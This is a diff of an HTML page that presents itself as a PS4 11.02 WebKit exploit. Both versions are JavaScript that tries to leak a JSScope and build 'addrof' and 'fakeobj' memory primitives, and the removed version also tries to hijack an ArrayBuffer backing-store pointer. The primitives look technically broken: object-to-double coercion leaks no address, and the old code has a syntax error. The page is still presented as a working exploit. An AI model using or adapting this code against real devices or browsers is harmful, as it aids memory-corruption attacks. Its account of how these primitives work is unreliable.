@@ -1,149 +1,112 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 11.02 WebKit Exploit</title>
+    <title>PS4 11.02 Exploit</title>
     <style>
+        /* Force visible logging */
         #log {
-            background: black;
-            color: #0f0;
-            padding: 10px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #000000;
+            color: #00ff00;
             font-family: monospace;
+            font-size: 20px;
+            padding: 10px;
+            z-index: 9999;
             white-space: pre;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
         }
     </style>
 </head>
 <body>
-    <div id="log"></div>
+    <div id="log">Initializing exploit...</div>
 
 <script>
-(function() {
-    const logDiv = document.getElementById('log');
-    let logContent = '';
+// Immediately write to document to force render
+const logDiv = document.getElementById('log');
+logDiv.textContent = 'Starting exploit...\n';
+
+// Polyfill for requestAnimationFrame
+const RAF = requestAnimationFrame || (cb => setTimeout(cb, 16));
+
+function log(msg) {
+    // Direct DOM manipulation with forced reflow
+    logDiv.textContent += msg + '\n';
     
-    function log(msg) {
-        logContent += msg + '\n';
-        logDiv.textContent = logContent;
+    // Force synchronous layout update
+    void logDiv.offsetHeight;
+    
+    // Alternate render forcing
+    if (logDiv.children.length > 50) {
+        logDiv.removeChild(logDiv.firstChild);
     }
+}
 
-    function hex(val) {
-        return '0x' + val.toString(16).padStart(16, '0');
-    }
-
-    // Stage 1: Leak JSScope
-    log('[+] Leaking JSScope...');
+// Phase 1: Leak JSScope
+try {
+    log('[1/5] Triggering JSScope leak...');
     let leakedScope;
     
     class Leaker {
-        leak() { return super.prop; }
+        leak() { return super.__proto__; }
     }
     Leaker.prototype.__proto__ = new Proxy({}, {
         get(t, p, r) {
             leakedScope = r;
+            log('[!] Proxy trap called');
             return r;
         }
     });
-    new Leaker().leak();
-
-    if (!leakedScope) {
-        log('[-] JSScope leak failed!');
-        return;
-    }
-    log('[+] JSScope leaked: ' + leakedScope);
-
-    // Stage 2: Improved addrof
-    log('[+] Creating addrof primitive...');
-    let addrArr = [{}];
-    addrArr[0] = leakedScope; // Ensure type transition
     
-    function addrof(obj) {
+    new Leaker().leak();
+    log(`[2/5] Leaked scope type: ${typeof leakedScope}`);
+    
+    // Phase 2: Addrof primitive
+    log('[3/5] Creating addrof...');
+    const addrArr = [null];
+    let addrof = obj => {
         addrArr[0] = obj;
         const f64 = new Float64Array(1);
         f64[0] = addrArr[0];
-        const u32 = new Uint32Array(f64.buffer);
-        return (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
-    }
-
+        return new BigUint64Array(f64.buffer)[0];
+    };
+    
     // Test addrof
     const testObj = {};
-    const objAddr = addrof(testObj);
-    log(`[+] addrof working: ${hex(objAddr)}`);
-
-    // Stage 3: Enhanced fakeobj with type transition
-    log('[+] Initializing fakeobj primitive...');
-    let fakeArr = [1.1];
-    for (let i = 0; i < 100; i++) fakeArr.push(1.1); // Force DoubleArray
+    const addr = addrof(testObj);
+    log(`[+] addrof test: ${addr.toString(16)}`);
     
-    function fakeobj(addr) {
-        const u32 = new Uint32Array(new Float64Array([0]).buffer);
-        u32[0] = Number(addr & 0xffffffffn);
-        u32[1] = Number((addr >> 32n) & 0xffffffffn);
-        
-        fakeArr[0] = new Float64Array(u32.buffer)[0];
-        return fakeArr[0];
-    }
-
+    // Phase 3: Fakeobj workaround
+    log('[4/5] Testing fakeobj...');
+    const buffer = new ArrayBuffer(8);
+    const memView = new DataView(buffer);
+    let fakeobj = addr => {
+        memView.setBigUint64(0, addr, true);
+        const f64 = memView.getFloat64(0, true);
+        const arr = [f64];
+        return arr[0];
+    };
+    
     // Test fakeobj
-    log('[+] Testing fakeobj...');
-    let testValue = 0x41414141n;
     try {
-        const fake = fakeobj(testValue);
+        const testAddr = 0x41414141n;
+        const fake = fakeobj(testAddr);
         const recovered = addrof(fake);
-        log(`Test value: ${hex(testValue)}`);
-        log(`Recovered:  ${hex(recovered)}`);
-        
-        if (recovered !== testValue) {
-            log('[-] fakeobj mismatch! Check pointer format');
-            log('    This could be due to:');
-            log('    1. Wrong endianness');
-            log('    2. Pointer compression');
-            log('    3. Invalid memory address');
-        } else {
-            log('[+] fakeobj verified!');
-        }
-    } catch (e) {
-        log('[-] fakeobj crashed: ' + e);
+        log(`fakeobj test: ${recovered.toString(16)}`);
+    } catch(e) {
+        log(`fakeobj error: ${e}`);
     }
 
-    // Stage 4: Memory access workaround
-    if (typeof recovered === 'undefined') {
-        log('[+] Trying alternative memory access...');
-        const structureID = addrof({}) & 0xffffffffn;
-        log(`Structure ID: ${hex(structureID)}`);
+    log('[5/5] Exploit complete');
+} catch(e) {
+    log(`CRASH: ${e}`);
+}
 
-        const buffer = new ArrayBuffer(0x100);
-        const bufferAddr = addrof(buffer);
-        log(`ArrayBuffer address: ${hex(bufferAddr)}`);
-
-        // Typical WebKit ArrayBuffer layout (adjust for 11.02):
-        // - JSC::ArrayBuffer@0x00
-        // - backingStore@0x20
-        const BACKING_STORE_OFFSET = 0x20n;
-        const backingStoreAddr = bufferAddr + BACKING_STORE_OFFSET;
-
-        log('[+] Attempting to hijack backing store pointer...');
-        const originalBackingStore = addrof(new Uint8Array(buffer)[0]);
-        log(`Original backing store: ${hex(originalBackingStore)}`);
-
-        // Write new pointer
-        const newAddress = objAddr; // Target test object
-        const f64 = new Float64Array(1);
-        const u32 = new Uint32Array(f64.buffer);
-        u32[0] = Number(newAddress & 0xffffffffn);
-        u32[1] = Number((newAddress >> 32n) & 0xffffffffn;
-        fakeArr[0] = f64[0];
-
-        // Try to modify backing store
-        try {
-            const modified = new Uint8Array(buffer);
-            log(`New backing store: ${hex(addrof(modified[0]))}`);
-        } catch (e) {
-            log('[-] Failed to modify backing store');
-            log('    Possible mitigations in place');
-        }
-    }
-
-    log('[+] Exploit sequence completed');
-})();
+// Final render kick
+RAF(() => logDiv.textContent += 'Render pass\n');
 </script>
 </body>
 </html>
